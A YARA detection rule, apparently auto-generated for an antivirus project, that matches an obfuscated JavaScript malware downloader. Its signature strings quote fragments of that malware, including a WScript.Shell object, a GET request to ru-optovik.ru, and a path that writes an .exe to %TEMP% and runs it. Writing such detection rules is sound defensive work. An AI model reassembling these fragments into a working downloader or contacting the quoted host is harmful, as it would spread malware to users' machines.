rule sig_20160330_e83efba800dfbfa4da6fbe43c446bf2f {
  meta:
    description = "datamaliciousorder - file 20160330_e83efba800dfbfa4da6fbe43c446bf2f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8b434868bb4d9d5e1b8f70ff3f2bd2170faa24fd8139bbec5522307432cde10c"

  strings:
    $s1  = "function _A(_FK, _Z){_X = _X * 1; return _FK - _Z;};" fullword ascii
    $s2  = "var _IM = function _U() {return WScript[_EL](\"WScript\"+\".Shell\");}(), _A1 = 11;" fullword ascii
    $s3  = "_TX[_K](\"GET\", \"http://ru-optovik.ru/j9ssl\", false);" fullword ascii
    $s4  = "if (_TX[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _RB() {return _IM[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"nCCBGfq3vMN.ex\" + \"e\";};" fullword ascii
    $s6  = "function _EH(){return _Y0 + \"\";};" fullword ascii
    $s7  = "function _D(_KE){_IM[\"Run\"](_KE, _X, _X);};" fullword ascii
    $s8  = "function _AU() {return ((_SZ == true) && (_SZ == _RJ)) ? 1 : _X;};" fullword ascii
    $s9  = "function _F(){return 22;};" fullword ascii
    $s10 = "var _T = new this[\"Date\"]();" fullword ascii
    $s11 = "return _A(_XX, _X1);" fullword ascii
    $s12 = "function _Q(){return _EL;};" fullword ascii
    $s13 = "function _N(_R) {var _JG = (1, 2, 3, 4, 5, _R); return _JG;};" fullword ascii
    $s14 = " while (_XM){" fullword ascii
    $s15 = "function _YA()" fullword ascii
    $s16 = "var _SZ = false;" fullword ascii
    $s17 = "_RJ = true; " fullword ascii
    $s18 = "var _JC = false;" fullword ascii
    $s19 = "var _RJ = false;" fullword ascii
    $s20 = "_SZ = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}